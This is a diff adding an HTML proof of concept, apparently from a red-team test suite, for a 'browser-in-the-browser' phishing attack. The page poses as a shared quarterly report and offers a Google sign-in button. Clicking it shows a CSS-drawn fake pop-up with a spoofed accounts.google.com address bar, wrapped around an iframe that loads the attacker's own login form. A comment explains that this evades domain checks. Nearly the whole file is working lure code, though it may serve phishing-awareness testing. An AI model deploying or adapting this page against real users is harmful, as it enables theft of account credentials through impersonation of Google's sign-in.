@@ -1,0 +1,31 @@
+<!doctype html>
+<!-- RT-13 PoC: browser-in-the-browser. A fake pop-up window drawn inside the
+     page with a fake address bar showing accounts.google.com; the real form
+     loads in an iframe from the attacker's own server. The browser's address
+     bar never changes, so domain checks can't see it. -->
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Shared document</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <script src="harness.js"></script>
+  <style>
+    body { font-family: system-ui, sans-serif; margin: 0; padding: 32px; }
+    .win { position: fixed; top: 70px; left: 50%; transform: translateX(-50%); width: min(460px, 92vw);
+      background: #fff; border: 1px solid #ccc; border-radius: 8px; box-shadow: 0 10px 40px #0004; overflow: hidden; }
+    .titlebar { background: #f1f3f4; padding: 8px 10px; font-size: 12px; color: #333; }
+    .url { background: #fff; border-radius: 12px; padding: 4px 10px; margin-top: 6px; font-size: 12px; color: #188038; }
+    iframe { width: 100%; height: 260px; border: 0; }
+  </style>
+</head>
+<body>
+  <h2>Quarterly report.pdf</h2>
+  <button onclick="document.querySelector('.win').hidden = false">Sign in with Google to view</button>
+  <div class="win" hidden>
+    <div class="titlebar">Sign in - Google Accounts
+      <div class="url">https://accounts.google.com/signin/v2/identifier</div>
+    </div>
+    <iframe src="fake-login.html" title="sign in"></iframe>
+  </div>
+</body>
+</html>
